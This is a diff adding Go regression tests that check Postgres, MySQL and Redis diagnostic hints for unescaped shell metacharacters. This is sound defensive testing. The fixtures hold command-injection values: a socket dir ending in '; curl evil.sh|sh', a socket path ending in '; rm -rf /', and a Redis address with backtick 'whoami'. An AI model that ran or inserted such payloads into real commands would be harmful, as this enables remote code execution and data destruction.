@@ -73,6 +73,20 @@ func TestCheckPostgres(t *testing.T) {
 	}
 }
 
+// TestCheckPostgresHintOmitsShellMetachars is a regression test for the
+// shell-metacharacter-injection class (distinct from the ANSI/control-escape
+// class PR #991 fixed): checkPostgres used to splice pg.SocketDir unescaped
+// into a copy-pasteable "to inspect: pg_isready -h <dir>" hint.
+func TestCheckPostgresHintOmitsShellMetachars(t *testing.T) {
+	got := checkPostgres(models.PostgresInfo{
+		Detected: true, Accepting: false, AcceptReason: "rejecting connections",
+		SocketDir: "/tmp; curl evil.sh|sh",
+	})
+	if insightHintsContain(got, "curl evil.sh") {
+		t.Errorf("Postgres hint must not embed the raw shell-metacharacter socket dir verbatim (copy-paste RCE risk): %+v", got)
+	}
+}
+
 func TestCheckMySQL(t *testing.T) {
 	if got := checkMySQL(models.MySQLInfo{Detected: false}); got != nil {
 		t.Errorf("undetected mysql should be silent, got %+v", got)
@@ -124,6 +138,18 @@ func TestCheckMySQL(t *testing.T) {
 	}
 }
 
+// TestCheckMySQLHintOmitsShellMetachars covers the same class for
+// my.SocketPath, spliced into "to inspect: mysqladmin --socket=<path> status".
+func TestCheckMySQLHintOmitsShellMetachars(t *testing.T) {
+	got := checkMySQL(models.MySQLInfo{
+		Detected: true, MetricsRead: false,
+		SocketPath: "/var/run/mysqld/mysqld.sock; rm -rf /",
+	})
+	if insightHintsContain(got, "rm -rf /") {
+		t.Errorf("MySQL hint must not embed the raw shell-metacharacter socket path verbatim (copy-paste RCE risk): %+v", got)
+	}
+}
+
 func TestCheckRedis(t *testing.T) {
 	if got := checkRedis(models.RedisInfo{Detected: false}); got != nil {
 		t.Errorf("undetected redis should be silent, got %+v", got)
@@ -167,5 +193,20 @@ func TestCheckRedis(t *testing.T) {
 	save := checkRedis(models.RedisInfo{Detected: true, MetricsRead: true, MaxClientsRead: true, Role: "master", LastSaveKnown: true, LastSaveOK: false})
 	if !insightWithMsg(save, "WARN", "save failed") {
 		t.Errorf("failed RDB save should WARN, got %+v", save)
+	}
+}
+
+// TestCheckRedisHintOmitsShellMetachars is a regression test for the shell-
+// metacharacter-injection class (distinct from the ANSI/control-escape class
+// PR #991 fixed): checkRedis used to splice r.Addr unescaped into
+// copy-pasteable "to inspect: redis-cli -s <addr> ..." hints throughout the
+// function.
+func TestCheckRedisHintOmitsShellMetachars(t *testing.T) {
+	got := checkRedis(models.RedisInfo{
+		Detected: true, MetricsRead: false,
+		Addr: "10.0.0.1:6379`whoami`",
+	})
+	if insightHintsContain(got, "whoami") {
+		t.Errorf("Redis hint must not embed the raw shell-metacharacter address verbatim (copy-paste RCE risk): %+v", got)
 	}
 }
